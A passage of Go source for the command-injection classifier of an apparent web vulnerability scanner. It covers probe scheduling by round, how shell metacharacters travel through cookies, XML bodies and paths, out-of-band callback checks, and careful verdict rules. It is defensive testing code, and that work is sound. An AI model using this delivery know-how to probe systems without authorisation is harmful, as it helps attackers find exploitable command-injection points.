				"or a Servlet container parses them as matrix parameters, so the separator battery is " +
				"gated on this class's own decode control",
		}
	case triage.KindCookie:
		return triage.Reachability{
			Reach: triage.ReachConditional,
			Reason: "a cookie value is cookie-octet only: $ ( ) ` { } are legal raw so the substitution " +
				"family always reaches, while ; & | and SPACE need percent-decoding, so the separator " +
				"battery is gated on decode depth and a decode_depth 0 cookie yields decode_depth_0 " +
				"rather than clean",
		}
	case triage.KindBody:
		if cmdiIsXML(mt) {
			return triage.Reachability{
				Reach: triage.ReachConditional,
				Reason: "XML element text cannot carry a raw & or <, so the && and || families need the " +
					"xml_cdata encoder, and a CDATA-delivered value is processed differently by some " +
					"parsers, which is a variable this class records rather than hides",
			}
		}
		return triage.Reachability{Reach: triage.ReachAlways}
	case triage.KindFragment:
		return triage.Reachability{
			Reach: triage.ReachNever,
			Reason: "RFC 3986 section 3.5 makes the fragment a client-side reference and every browser " +
				"strips it before the request leaves, so no server-side shell can ever see it. " +
				"not_applicable (fragment), and there is no browser-tier analogue for this class: a " +
				"browser cannot run a command on the server",
		}
	default:
		return triage.Reachability{
			Reach:  triage.ReachNever,
			Reason: "insertion point " + string(k) + " is not in the closed set this class was designed against",
		}
	}
}

func cmdiIsXML(mt triage.MediaType) bool {
	s := string(mt)
	return strings.Contains(s, "xml")
}

// ---------------------------------------------------------------------------------------------
// THE LADDER
// ---------------------------------------------------------------------------------------------

// cmdiEnv is everything outside this class's own responses that its ladder and its verdict read.
//
// WHY IT EXISTS. PlanCtx and ClassifyCtx carry Replay and OwnedResponses, both of which only
// package triage can construct, with a capability this package deliberately cannot import. A test
// in this package therefore cannot build a ctx with a resolved route, a resolved post-baseline or
// a single callback in it, so every rule that reads one of those would be unreachable from a
// test, and an unreachable rule is an untested rule. Naming the read surface as a plain value
// fixes that AND makes the surface reviewable: the list below is the complete set of things this
// class looks at besides its own probes.
type cmdiEnv struct {
	slot      triage.Slot
	round     int
	route     cmdiSnapshot
	postBase  bool // did the post-baseline resolve
	baseline  triage.BaselineModel
	oobMode   triage.OOBMode
	oobServes bool
	callbacks []triage.CallbackRec
}

// cmdiSnapshot is the comparable part of the route control: what a uniform block is measured
// against, and the body the argument-injection banner rule subtracts.
type cmdiSnapshot struct {
	status int
	sha    [32]byte
	body   []byte
}

func cmdiSnapshotOf(obs triage.Observation) cmdiSnapshot {
	sha := obs.Proj.NormBodySHA256
	if sha == ([32]byte{}) {
		sha = obs.BodySHA256
	}
	return cmdiSnapshot{status: obs.Status, sha: sha, body: obs.Body}
}

// cmdiBodyKey is the identity two responses are compared on.
//
// IT FALLS BACK TO THE BODY BYTES, AND THAT IS THE POINT. An all-zero SHA means nobody computed
// one, which is a completely different fact from two bodies being equal, and a comparator that
// treats the two the same reads every unprojected response as identical to every other. That
// turns three honest and different responses into a uniform block, which is an unknown, so it
// fails safe rather than reporting clean, but it is still wrong and it would hide real findings
// behind cannot_determine (blocked) on any run where the projector had not caught up.
func cmdiBodyKey(status int, norm, raw [32]byte, body []byte) string {
	switch {
	case norm != ([32]byte{}):
		return fmt.Sprintf("%d:n:%x", status, norm)
	case raw != ([32]byte{}):
		return fmt.Sprintf("%d:r:%x", status, raw)
	default:
		return fmt.Sprintf("%d:b:%s", status, body)
	}
}

func cmdiEnvOfPlan(ctx triage.PlanCtx) cmdiEnv {
	return cmdiEnv{
		slot:      ctx.Slot,
		round:     ctx.Round,
		route:     cmdiSnapshotOf(ctx.Route.Obs()),
		baseline:  ctx.Baseline,
		oobMode:   ctx.OOB.Mode,
		oobServes: ctx.OOB.ServesContent,
	}
}

func cmdiEnvOfClassify(ctx triage.ClassifyCtx) cmdiEnv {
	e := cmdiEnvOfPlan(ctx.PlanCtx)
	e.postBase = ctx.PostBaseline.Resolved()
	for i := 0; i < ctx.Callbacks.Len(); i++ {
		rec, err := ctx.Callbacks.At(i)
		if err != nil {
			continue // a callback this class cannot own is a hit for nobody
		}
		e.callbacks = append(e.callbacks, rec)
	}
	return e
}

// Plan is the ladder of CATALOGUE 2.1. Round 0 is the census, the control set and the first
// separator; round 1 the rest of the POSIX battery; round 2 Windows; round 3 argument injection;
// round 4 out of band; round 5 confirmation and identification.
//
// THE ONE DELIBERATELY PARTIAL EARLY EXIT. A uniform block stops the metacharacter families and
// LETS THE ARGUMENT-INJECTION FAMILY CONTINUE, because that family contains no metacharacter at
// all and a metacharacter validator does not see it. Everything else stops together.
func (c cmdiClassifier) Plan(ctx triage.PlanCtx) []triage.ProbeRequest {
	if !cmdiSendable(ctx) {
		return nil
	}
	shots, err := cmdiShotsOf(ctx.Own)
	if err != nil {
		return nil // an unreadable own-response set is a runner bug, and Classify says so loudly
	}
	return cmdiPlan(cmdiEnvOfPlan(ctx), shots)
}

// cmdiPlan is the ladder proper, over the named read surface.
func cmdiPlan(env cmdiEnv, shots []cmdiShot) []triage.ProbeRequest {
	sent := map[triage.ProbeID]bool{}
	for _, s := range shots {
		sent[s.probe] = true
	}
	fired := cmdiAnyComputeHit(shots)
	blocked := cmdiUniformBlock(env, shots)

	var want []triage.ProbeID
	switch env.round {
	case 0:
		want = []triage.ProbeID{cmdiC0, cmdiNC1, cmdiNC2, cmdiNC3, cmdiNC4, cmdiB1}
		if env.slot.Constraints.DecodeDepth < 0 {
			// R6a: this class's own decode control, and only when nobody has measured the slot.
			want = append([]triage.ProbeID{cmdiDEC}, want...)
		}
	case 1:
		if fired || blocked {
			break // the separator battery is over; round 3 still runs.
		}
		want = []triage.ProbeID{
			cmdiB2, cmdiB3, cmdiB4, cmdiB5, cmdiB6,
			cmdiB7, cmdiB8, cmdiB17, cmdiB18, cmdiB9, cmdiB10, cmdiB11, cmdiB12, cmdiB13, cmdiB14, cmdiB15,
		}
	case 2:
		if fired || blocked {
			break
		}
		want = []triage.ProbeID{cmdiW1, cmdiW2, cmdiW3, cmdiW4, cmdiW5, cmdiW6}
	case 3:
		// ARGUMENT INJECTION RUNS EVEN UNDER A UNIFORM BLOCK. It carries no metacharacter, so a
		// validator that rejected everything above has not been shown to reject this.
		if fired {
			break
		}
		want = []triage.ProbeID{cmdiA1, cmdiA2, cmdiA3, cmdiA4, cmdiA5}
	case 4:
		if fired || blocked || env.oobMode == triage.OOBNone {
			break
		}
		want = []triage.ProbeID{cmdiNC5, cmdiO1, cmdiO4}
		if env.oobMode == triage.OOBHTTPPath || env.oobServes {
			want = append(want, cmdiO2, cmdiO3)
		}
	case 5:
		if !fired {
			break
		}
		want = []triage.ProbeID{cmdiCF1, cmdiCF2, cmdiCF3, cmdiB16, cmdiS2, cmdiS1, cmdiS3}
	}

	specs := cmdiSpecIndex()
	out := make([]triage.ProbeRequest, 0, len(want))
	for _, id := range want {
		if sent[id] {
			continue
		}
		spec, ok := specs[id]
		if !ok {
			continue
		}
		if why := cmdiUndeliverable(env.slot, spec); why != "" {
			continue // Classify turns the same predicate into a named Untested row.
		}
		out = append(out, triage.ProbeRequest{
			Spec:    id,
			Slot:    env.slot.Key,
			Variant: cmdiVariantFor(spec),
		})
	}
	if len(out) == 0 {
		return nil
	}
	return out
}

// cmdiSendable is the set of foundations states that stop this class sending anything at all.
func cmdiSendable(ctx triage.PlanCtx) bool {
	if ctx.Slot.Constraints.IsCredential {
		return false
	}
	if !ctx.Slot.ServerReachable {
		return false
	}
	if ctx.Slot.Kind == triage.KindFragment {
		return false
	}
	if ctx.Prelude.Failed() {
		return false
	}
	if !ctx.Route.Resolved() {
		return false
	}
	if ctx.Budget.Exhausted() {
		return false
	}
	return true
}

// cmdiVariantFor records the per-instance values the runner needs: the operands, so the stored
// observation says which arithmetic this probe carried, and the marker offset for the inline
// placements.
func cmdiVariantFor(spec triage.ProbeSpec) map[string]string {
	v := map[string]string{}
	switch {
	case bytes.Contains(spec.Logical, []byte(cmdiConfirmA)):
		v["operand_a"], v["operand_b"], v["expected"] = cmdiConfirmA, cmdiConfirmB, cmdiConfirmSum
	case bytes.Contains(spec.Logical, []byte(cmdiOperandA)):
		v["operand_a"], v["operand_b"], v["expected"] = cmdiOperandA, cmdiOperandB, cmdiSum
	}
	if spec.MarkerPos == triage.MarkerInline {
		v["marker_offset"] = fmt.Sprintf("%d", bytes.Index(spec.Logical, []byte(cmdiMark)))
	}
	if bytes.Contains(spec.Logical, []byte(cmdiOOBBase)) {
		v["oob_label"] = cmdiMark
	}
	return v
}

// cmdiUndeliverable returns the reason this probe cannot be delivered to this slot, or "".
//
// EVERY REASON HERE BECOMES AN Untested ROW, never a silence. A family that was not sent because
// the bytes could not travel is a different fact from a family that was sent and found nothing,
// and rendering them the same pixel is how a class reports clean on a surface it never touched.
func cmdiUndeliverable(slot triage.Slot, spec triage.ProbeSpec) string {
	ok := false
	for _, k := range spec.Points {
		if k == slot.Kind {
			ok = true
			break
		}
	}
	if !ok {
		return "point_not_declared"
	}
	if spec.ID == cmdiB6 && slot.Kind != triage.KindBody {
		return "header_crlf"
	}
	if spec.ID == cmdiB10 && slot.Kind == triage.KindBody && slot.BodyMedia == triage.BodyJSON {
		return "json_string"
	}
	// The placeholders are resolved FIRST. Found by the cookie test: the marker placeholder is
	// spelled with angle brackets, so a raw scan of the declared bytes saw a < in every payload
	// carrying a marker and declared the whole whitespace-free substitution family undeliverable
	// to a cookie, which is the one surface it exists to reach. A minted marker is sixteen bytes
	// of lowercase base36, every one of them cookie-octet, and the slot's own observed value
	// arrived in that slot once already by definition.
	resolved := cmdiResolvedBytes(spec, slot)
	if slot.Kind == triage.KindCookie && slot.Constraints.DecodeDepth == 0 && cmdiNeedsDecoding(resolved) {
		return "decode_depth_0"
	}
	if slot.Kind == triage.KindPath && slot.Constraints.PctRejected && cmdiNeedsDecoding(resolved) {
		return "pct_rejected"
	}
	if cmdiWantsObservedValue(spec) && slot.Value == "" {
		return "no_observed_value"
	}
	return ""
}

// cmdiNeedsDecoding reports whether the payload contains a byte that a cookie or a path segment
// cannot carry raw, so delivering it depends on the slot percent-decoding.
// cmdiResolvedBytes is the payload as it will actually look once the runner has substituted the
// placeholders, which is the only form worth asking a delivery question about.
func cmdiResolvedBytes(spec triage.ProbeSpec, slot triage.Slot) []byte {
	s := string(spec.Logical)
	s = strings.ReplaceAll(s, cmdiMark, "zzzzzzzzzzzzzzzz") // sixteen bytes of the marker alphabet
	s = strings.ReplaceAll(s, cmdiObservedValue, slot.Value)
	s = strings.ReplaceAll(s, cmdiOOBBase, "collaborator.invalid")
	return []byte(s)
}

func cmdiNeedsDecoding(payload []byte) bool {
	for _, b := range []byte{';', ',', ' ', '\t', '\n', '"', '\\', '<'} {
		if bytes.IndexByte(payload, b) >= 0 {
			return true
		}
	}
	return false
}

func cmdiWantsObservedValue(spec triage.ProbeSpec) bool {
	return bytes.Contains(spec.Logical, []byte(cmdiObservedValue))
}

func cmdiSpecIndex() map[triage.ProbeID]triage.ProbeSpec {
	out := map[triage.ProbeID]triage.ProbeSpec{}
	for _, p := range (cmdiClassifier{}).Probes() {
		out[p.ID] = p
	}
	return out
}

// ---------------------------------------------------------------------------------------------
// THE VERDICT
// ---------------------------------------------------------------------------------------------

// cmdiShot is one of this class's own probes and the response it got. It is a local value type,
// not a field on the classifier: a classifier keeps nothing between calls, and RegisterClassifier
// refuses one that could.
type cmdiShot struct {
	probe   triage.ProbeID
	ordinal uint64
	marker  triage.Marker
	obs     triage.Observation
}

func cmdiShotsOf(own triage.OwnedResponses) ([]cmdiShot, error) {
	out := make([]cmdiShot, 0, own.Len())
	for i := 0; i < own.Len(); i++ {
		p, obs, err := own.At(i)
		if err != nil {
			return nil, err
		}
		out = append(out, cmdiShot{probe: p.ProbeID(), ordinal: p.Ordinal(), marker: p.Marker(), obs: obs})
	}
	return out, nil
}

// The named states this class can land in. They are named because "not knowing" needs as many
// distinct words as there are ways of not knowing, and because a reader of the report has to be
// able to tell them apart at a glance.
const (
	cmdiReasonPlaceholder   = "classifier_placeholder_unexpanded"
	cmdiReasonNotDelivered  = "probe_not_delivered"
	cmdiReasonWireUnproven  = "wire_survival_unproven"
	cmdiReasonDetectorBad   = "detector_unverified"
	cmdiReasonBlocked       = "blocked"
	cmdiReasonBlindNoOracle = "no_oob_endpoint"
	cmdiReasonEgress        = "egress_resolver"
	cmdiReasonNoPostBase    = "post_baseline_unresolved"
	cmdiReasonDrift         = "drift"
	cmdiReasonNothing       = "no_probe_reached_this_slot"
	cmdiReasonFragment      = "fragment"
	cmdiReasonCredential    = "is_credential"
	cmdiReasonPrelude       = "prelude_failed"
	cmdiReasonRoute         = "route_unresolved"
	cmdiReasonBudget        = "probe_budget_exhausted"
	cmdiReasonCanary        = "canary_resource"
	cmdiReasonForeignMarker = "foreign_marker_observed"
	cmdiReasonNoMarker      = "marker_never_minted"
	cmdiReasonFamilies      = "families_not_sent"
)

// The annotation key that splits a slot's verdict into two routes when a uniform block lands. The
// metacharacter families and the argument-injection family are different mechanisms and a block
// on one is not evidence about the other, so they get one row each rather than one merged row
// that would have to lie about one of them.
const (
	cmdiRouteKey      = "cmdi_route"
	cmdiRouteMetachar = "metacharacter"
	cmdiRouteArgv     = "argument_injection"
)

// Classify is the verdict. It is a pure function of ctx and it may return more than one row for a
// slot, which CATALOGUE 4.3 allows and MASSASSIGN already relies on.
func (c cmdiClassifier) Classify(ctx triage.ClassifyCtx) []triage.ClassVerdict {
	key := ctx.Slot.Key

	// Structural refusals first. Each is a different fact and each gets its own word.
	if ctx.Slot.Kind == triage.KindFragment || !ctx.Slot.ServerReachable {
		return cmdiOne(key, triage.StateNotApplicable, cmdiReasonFragment,
			"a fragment never leaves the browser, so no server-side shell can observe it and there is nothing here to test")
	}
	if ctx.Slot.Constraints.IsCredential {
		return cmdiOne(key, triage.StateNotRun, cmdiReasonCredential,
			"a credential slot is deliberately never probed: a 401 from a mangled session token is a differential that looks exactly like a finding")
	}
	if ctx.Prelude.Failed() {
		return cmdiOne(key, triage.StateCannotDetermine, cmdiReasonPrelude,
			"the prelude did not yield a usable token, so every probe would have failed validation identically, which reads as a stable endpoint with no differential and is not a measurement")
	}
	if !ctx.Route.Resolved() {
		return cmdiOne(key, triage.StateCannotDetermine, cmdiReasonRoute,
			"the route control did not resolve, so there is no control to difference against and nothing sent here could be interpreted")
	}

	shots, err := cmdiShotsOf(ctx.Own)
	if err != nil {
		return cmdiOne(key, triage.StateCannotDetermine, "own_responses_unreadable",
			"this class's own response set refused a read, which means attribution is unsafe: "+err.Error())
	}
	return cmdiVerdict(cmdiEnvOfClassify(ctx), shots)
}

// verdictFrom is Classify once the class's own responses are in hand.
//
// WHY IT IS A SEPARATE FUNCTION. OwnedResponses can only be constructed inside package triage,
// with a capability this package deliberately cannot import, so no test in this package can hand
// Classify a non-empty Own. Every detection rule below would therefore be unreachable from a
// test, and an unreachable rule is an untested rule. The split costs one call and makes the whole
// verdict surface exercisable against synthetic observations.
func cmdiVerdict(env cmdiEnv, shots []cmdiShot) []triage.ClassVerdict {
	key := env.slot.Key
	if len(shots) == 0 {
		return cmdiOne(key, triage.StateNotPlanned, cmdiReasonNothing,
			"no probe of this class reached this slot, and nothing about it was measured")
	}

	untested := cmdiUntestedFor(env.slot, shots)
	ordinals := cmdiOrdinals(shots)

	// A detector that has fired on its own negative control is broken, and everything it said
	// about this slot is worthless. This check comes before any hit is reported.
	if bad, which := cmdiControlFired(shots); bad {
		return cmdiOneFull(key, triage.StateCannotDetermine, cmdiReasonDetectorBad,
			"this class's negative control "+string(which)+" fired its own rule, so the detector has been shown matching something that is not a shell and every verdict it would emit on this slot is void",
			ordinals, untested, nil)
	}

	// The out-of-band branch. A callback is the only oracle for a slot that does not echo, so it
	// is read before the body rules and it is guarded by its own control.
	if v, ok := cmdiCallbackVerdict(env, shots, ordinals, untested); ok {
		return v
	}

	// C-D1, computation. The strongest oracle this class has.
	if hit, ok := cmdiFirstComputeHit(shots); ok {
		return cmdiComputeFinding(env, shots, hit, ordinals, untested)
	}

	// C-D3, the curated banners. Windows identification is deterministic; an argument-injection
	// banner is a curated signature and is capped at suspicious.
	if v, ok := cmdiBannerVerdict(env, shots, ordinals, untested); ok {
		return v
	}

	// Nothing fired. Everything from here is about whether this class is ALLOWED to say clean,
	// and the default answer is no.
	return cmdiSilentVerdict(env, shots, ordinals, untested)
}

// callbackVerdict reads this class's own out-of-band hits. Its control comes first: if the bare
// label resolved, the target resolves every hostname it is handed and a DNS hit proves nothing.
func cmdiCallbackVerdict(env cmdiEnv, shots []cmdiShot, ordinals []uint64, untested []triage.ProbeSkip) ([]triage.ClassVerdict, bool) {
	if len(env.callbacks) == 0 {
		return nil, false
	}
	byMarker := map[triage.Marker]cmdiShot{}
	for _, s := range shots {
		byMarker[s.marker] = s
	}
	var real []cmdiShot
	egress := false
	for _, rec := range env.callbacks {
		s, ok := byMarker[rec.Marker]
		if !ok {
			continue // a callback we cannot tie to one of our own probes attributes to nobody
		}
		if s.probe == cmdiNC5 {
			egress = true
			continue
		}
		real = append(real, s)
	}
	switch {
	case egress:
		return cmdiOneFull(env.slot.Key, triage.StateCannotDetermine, cmdiReasonEgress,
			"CMDI-NC5, a bare hostname with no separator and no command, resolved. The target resolves every hostname-shaped string it is handed, so a callback from CMDI-O1 or CMDI-O4 is evidence about a link unfurler or a DLP scanner and not about a shell",
			ordinals, untested, nil), true
	case len(real) > 0:
		ev := triage.TriageEvidence{
			Ordinal: real[0].ordinal,
			ObsID:   real[0].obs.ObsID,
			Phrase:  "out_of_band_callback",
			Wire:    real[0].obs.Payload,
		}
		v := cmdiOneFull(env.slot.Key, triage.StateFinding, "",
			"this class's own out-of-band probe "+string(real[0].probe)+" produced a callback carrying a marker from this class's ordinal stripe, and the egress control CMDI-NC5 did not resolve, so a command ran on the target",
			ordinals, untested, nil)
		v[0].Grade = triage.GradeHigh
		v[0].Oracle = "oob"
		v[0].Evidence = ev
		v[0].Label = cmdiLabel("", "")
		return v, true
	}
	return nil, false
}

// computeFinding is the C-D1 branch: an answer string in the body that the request never carried.
func cmdiComputeFinding(env cmdiEnv, shots []cmdiShot, hit cmdiHit, ordinals []uint64, untested []triage.ProbeSkip) []triage.ClassVerdict {
	grade := triage.GradeMedium
	var reason string
	confirmed, confProbe := cmdiConfirmedHit(shots)
	if confirmed {
		grade = triage.GradeHigh
		reason = "this class's own probe " + string(hit.probe) + " produced the contiguous byte run " +
			hit.mechanism + ", which the request did not contain, and " + string(confProbe) +
			" reproduced it with a fresh marker and the fresh operands " + cmdiConfirmA + "+" + cmdiConfirmB +
			", so the answer is computed on the target and not echoed"
	} else {
		reason = "this class's own probe " + string(hit.probe) + " produced the contiguous byte run " +
			hit.mechanism + ", which the request did not contain, so a shell evaluated the input. " +
			"The confirmation probe with fresh operands has not reported, so the grade is held at medium"
	}
	v := cmdiOneFull(env.slot.Key, triage.StateFinding, "", reason, ordinals, untested, nil)
	v[0].Grade = grade
	v[0].Oracle = "computation"
	v[0].Evidence = triage.TriageEvidence{
		Ordinal: hit.ordinal,
		ObsID:   hit.obs.ObsID,
		Matched: hit.matched,
		Offset:  hit.offset,
		Length:  len(hit.matched),
		Phrase:  hit.mechanism,
		Wire:    hit.obs.Payload,
	}
	v[0].Label = cmdiLabel(cmdiIdentifiedShell(shots), cmdiIdentifiedOS(shots))
	v[0].Annotations = map[string]any{
		"cmdi_mechanism":     hit.mechanism,
		"cmdi_winning_probe": string(hit.probe),
		"cmdi_separators_not_sent": cmdiSkipIDs(untested,
			[]triage.ProbeID{cmdiB2, cmdiB3, cmdiB4, cmdiB5, cmdiB6, cmdiB9, cmdiB10, cmdiB11, cmdiB12, cmdiB14, cmdiB15}),
	}
	return v
}

// bannerVerdict is C-D3. Windows variable expansion is deterministic and is reported as a
// finding; an argument-injection version banner is a curated signature and is capped at
// suspicious, because an application is allowed to print the word version by itself.
func cmdiBannerVerdict(env cmdiEnv, shots []cmdiShot, ordinals []uint64, untested []triage.ProbeSkip) ([]triage.ClassVerdict, bool) {
	for _, s := range shots {
		if s.probe != cmdiW3 && s.probe != cmdiW5 {
			continue
		}
		if m, off, ok := cmdiWindowsExpansion(s); ok {
			v := cmdiOneFull(env.slot.Key, triage.StateFinding, "",
				"this class's own probe "+string(s.probe)+" produced a cmd.exe variable expansion immediately after its own marker, which only an interpreting cmd.exe emits and the request never contained",
				ordinals, untested, nil)
			v[0].Grade = triage.GradeMedium
			v[0].Oracle = "banner"
			v[0].Evidence = triage.TriageEvidence{
				Ordinal: s.ordinal, ObsID: s.obs.ObsID, Matched: m, Offset: off,
				Length: len(m), Phrase: "cmd_exe_variable_expansion", Wire: s.obs.Payload,
			}
			v[0].Label = cmdiLabel("cmd.exe", "windows")
			return v, true
		}
	}
	for _, s := range shots {
		if !cmdiIsArgProbe(s.probe) {
			continue
		}
		phrase, off, ok := cmdiToolBanner(s.obs.Body, env.route.body)
		if !ok {
			continue
		}
		v := cmdiOneFull(env.slot.Key, triage.StateSuspicious, "",
			"this class's own argument-injection probe "+string(s.probe)+" produced the tool banner "+phrase+
				", which is absent from the route control at the slot's observed value. The value reaches an argv array, so no separator probe would ever have found this. Capped at suspicious because a banner is a curated signature and not a computation",
			ordinals, untested, nil)
		v[0].Grade = triage.GradeMedium
		v[0].Oracle = "banner"
		v[0].Evidence = triage.TriageEvidence{
			Ordinal: s.ordinal, ObsID: s.obs.ObsID, Matched: []byte(phrase), Offset: off,
			Length: len(phrase), Phrase: "tool_version_banner", Wire: s.obs.Payload,
		}
		v[0].Label = cmdiLabel("", "")
		v[0].Annotations = map[string]any{"cmdi_banner": phrase, cmdiRouteKey: cmdiRouteArgv}
		return v, true
	}
	return nil, false
}

// silentVerdict is where a class earns the right to say clean, and mostly does not.
//
// CLEAN HERE MEANS, AND ONLY MEANS: this class's own probes were built, reached the wire intact,
// were delivered, every family deliverable to this slot was sent, an oracle was structurally
// AVAILABLE, and none of this class's rules fired. Remove any one of those and the honest answer
// is an unknown with its own name.
func cmdiSilentVerdict(env cmdiEnv, shots []cmdiShot, ordinals []uint64, untested []triage.ProbeSkip) []triage.ClassVerdict {
	key := env.slot.Key

	// Fidelity. A probe that never reached the wire is not a probe that found nothing.
	if why, which := cmdiFidelity(shots); why != "" {
		return cmdiOneFull(key, triage.StateCannotDetermine, why,
			"probe "+string(which)+" cannot be read as a silence: "+cmdiFidelityDetail(why),
			ordinals, untested, nil)
	}

	// A uniform block splits the slot into two routes, and this is the one deliberately partial
	// early exit in the class. The metacharacter families were blocked; the argument-injection
	// family carries no metacharacter and the validator that rejected them has not been shown to
	// reject it.
	if cmdiUniformBlock(env, shots) {
		return cmdiBlockedPair(env, shots, ordinals, untested)
	}

	if !env.postBase {
		return cmdiOneFull(key, triage.StateCannotDetermine, cmdiReasonNoPostBase,
			"the post-baseline did not resolve, so nothing rules out the endpoint having drifted underneath the probes, and a silence measured across a drift is not a silence",
			ordinals, untested, nil)
	}
	if env.baseline.Degraded || (env.baseline.Samples > 0 && !env.baseline.Stable && env.baseline.GateReason != "") {
		return cmdiOneFull(key, triage.StateCannotDetermine, cmdiReasonDrift,
			"the baseline model reports "+cmdiBaselineWhy(env.baseline)+", so this endpoint's own variation is larger than any signal this class could have seen",
			ordinals, untested, nil)
	}

	// A slot probed at a resource the application does not have was never scanned, whatever else
	// went out, so this comes before the family check and before any clean.
	if env.slot.ValueOrigin == triage.ValueCanary {
		return cmdiOneFull(key, triage.StateCannotDetermine, cmdiReasonCanary,
			"the slot's value was fabricated rather than observed, so every probe was aimed at a resource the application does not have, and a scan of a 404 is not a scan of the endpoint",
			ordinals, untested, nil)
	}

	// Every family this slot can carry has to have been SENT. CATALOGUE 4.5 rule 2 names this as
	// this class's own clean-precondition, and it is the one that stops a class saying clean
	// after the census probe and nothing else.
	missing := cmdiMissingFamilies(env, shots)

	// THE BLIND CASE, AND IT IS THE POINT OF THIS CLASS. No echo and no collaborator means there
	// was no oracle to be silent with.
	echo := cmdiEchoAvailable(shots)
	oob := env.oobMode != triage.OOBNone
	if !echo && !oob {
		v := cmdiOneFull(key, triage.StateCannotDetermine, cmdiReasonBlindNoOracle,
			"this slot echoes nothing: the census probe CMDI-C0's own marker did not come back in the body, any response header or any redirect hop, and no collaborator is configured. Blind command injection has NO non-timing oracle, so this class did not measure this slot and cannot say it is clean. Point commix at it",
			ordinals, untested, nil)
		v[0].Label = cmdiLabel("", "")
		v[0].Annotations = map[string]any{
			"cmdi_echo_available": false,
			"cmdi_oob_configured": false,
			"cmdi_timing_offered": false,
			"cmdi_timing_note": "CMDI-T0, CMDI-T2 and CMDI-T5 are declared and are never planned: the " +
				"run-wide one-slot-at-a-time serialisation that CATALOGUE 7.4 requires is not exposed " +
				"by PlanCtx, and N concurrent five-second sleeps against a pool of N workers is a " +
				"denial of service nobody asked for",
		}
		return v
	}
	if len(missing) > 0 {
		return cmdiOneFull(key, triage.StateCannotDetermine, cmdiReasonFamilies,
			"this class did not send every family it can deliver to this slot, so its silence covers "+
				"only the families that went out. Not sent: "+cmdiNameProbes(missing),
			ordinals, untested, map[string]any{"cmdi_families_not_sent": cmdiNameProbes(missing)})
	}
	if !oob {
		// An echo exists, so the computation oracle was available, but a blind sink on the same
		// slot would still be invisible. Say so rather than implying full coverage.
		return cmdiCleanRow(env, ordinals, untested, echo, false)
	}
	return cmdiCleanRow(env, ordinals, untested, echo, true)
}

// blockedPair emits the two rows a uniform block deserves.
func cmdiBlockedPair(env cmdiEnv, shots []cmdiShot, ordinals []uint64, untested []triage.ProbeSkip) []triage.ClassVerdict {
	meta := cmdiOneFull(env.slot.Key, triage.StateCannotDetermine, cmdiReasonBlocked,
		"three or more of this class's own distinct payloads produced byte-identical normalised responses that differ from the route control, which is a uniform block. A block is not a defence measurement: nothing here says whether a shell is behind it",
		ordinals, untested, map[string]any{cmdiRouteKey: cmdiRouteMetachar})
	argvSent := false
	for _, s := range shots {
		if cmdiIsArgProbe(s.probe) {
			argvSent = true
			break
		}
	}
	state, reason, detail := triage.StateNotRun, "argument_injection_not_sent",
		"the argument-injection family carries no metacharacter and was not blocked, and it has not been sent at this slot yet, so nothing is known about the argv route"
	if argvSent {
		state, reason, detail = triage.StateCannotDetermine, cmdiReasonBlocked,
			"the argument-injection family was sent under the same uniform block, so its silence cannot be separated from the block"
	}
	argv := cmdiOneFull(env.slot.Key, state, reason, detail, ordinals, untested,
		map[string]any{cmdiRouteKey: cmdiRouteArgv})
	return append(meta, argv...)
}

// cmdiCleanRow builds the one clean this class is allowed to emit, with its preconditions
// printed on it, which is CATALOGUE 4.5 rule 2.
func cmdiCleanRow(env cmdiEnv, ordinals []uint64, untested []triage.ProbeSkip, echo, oob bool) []triage.ClassVerdict {
	reason := "every family this class can deliver to this slot was sent, every payload was proven on the wire, the endpoint did not block, the post-baseline resolved, and not one of this class's own rules fired"
	v := cmdiOneFull(env.slot.Key, triage.StateClean, reason, reason, ordinals, untested, map[string]any{
		"cmdi_echo_available":   echo,
		"cmdi_oob_configured":   oob,
		"cmdi_families_skipped": len(untested),
		"cmdi_blind_sink_note": "a sink that runs a command and discards its output on THIS slot would " +
			"still be invisible unless a collaborator was configured; this clean covers the echoing " +
			"and out-of-band routes that were actually available",
	})
	v[0].Oracle = "computation"
	return v
}

// ---------------------------------------------------------------------------------------------
// THE DETECTION RULES
// ---------------------------------------------------------------------------------------------

type cmdiHit struct {
	probe     triage.ProbeID
	ordinal   uint64
	obs       triage.Observation
	matched   []byte
	offset    int
	mechanism string
}

// cmdiComputeHit is the C-D1 rule, and it is the whole class.
//
// THE THREE CLAUSES ARE ALL LOAD BEARING.
//  1. the answer string appears in the RESPONSE,
//  2. the marker in it is this probe's own minted marker, so it cannot be another class's or
//     another run's, and
//  3. the same bytes do NOT appear anywhere in the REQUEST that produced the response.
//
// Clause 3 is what CMDI-NC2 exists to prove: a reflecting endpoint hands the answer straight back
// if you put it in the wire, and a detector without clause 3 calls every echo a command
// injection. The baseline needs no separate clause: this run's marker cannot be in a body
// captured before the marker was minted.
func cmdiComputeHit(s cmdiShot) (cmdiHit, bool) {
	if !s.obs.Delivered() || s.marker == "" || !s.marker.BelongsTo(triage.ClassCMDI) {
		// R12: a marker whose ordinal stripe is not this class's is foreign_marker_observed, a
		// hit for nobody. Own is already filtered, so reaching here is a runner bug, and the
		// fidelity guard turns it into a loud unknown rather than a quiet miss.
		return cmdiHit{}, false
	}
	if s.probe == cmdiNC1 || s.probe == cmdiNC2 || s.probe == cmdiNC3 || s.probe == cmdiNC4 || s.probe == cmdiNC5 {
		return cmdiHit{}, false
	}
	candidates := []struct {
		bytes     []byte
		mechanism string
	}{
		{cmdiAnswerConfirm(s.marker), "arithmetic_and_substitution_confirmed"},
		{cmdiAnswerBoth(s.marker), "arithmetic_and_substitution"},
		{cmdiAnswerSubst(s.marker), "command_substitution"},
		{cmdiAnswerArith(s.marker), "arithmetic_expansion"},
	}
	for _, c := range candidates {
		if off, ok := cmdiInResponseNotInRequest(s.obs, c.bytes); ok {
			return cmdiHit{probe: s.probe, ordinal: s.ordinal, obs: s.obs,
				matched: c.bytes, offset: off, mechanism: c.mechanism}, true
		}
	}
	return cmdiHit{}, false
}

// cmdiControlFired asks the question the other way round: did a NEGATIVE control fire? A detector
// that has never been shown staying silent is not verified, and one shown firing on its own
// control is broken.
func cmdiControlFired(shots []cmdiShot) (bool, triage.ProbeID) {
	for _, s := range shots {
		switch s.probe {
		case cmdiNC1, cmdiNC4:
			// These carry no answer bytes at all, so ANY answer string in the response is the
			// detector matching something that is not a shell.
			if s.marker == "" || !s.obs.Delivered() {
				continue
			}
			for _, want := range [][]byte{cmdiAnswerBoth(s.marker), cmdiAnswerSubst(s.marker), cmdiAnswerArith(s.marker)} {
				if _, ok := cmdiInResponseNotInRequest(s.obs, want); ok {
					return true, s.probe
				}
			}
		case cmdiNC2, cmdiNC3:
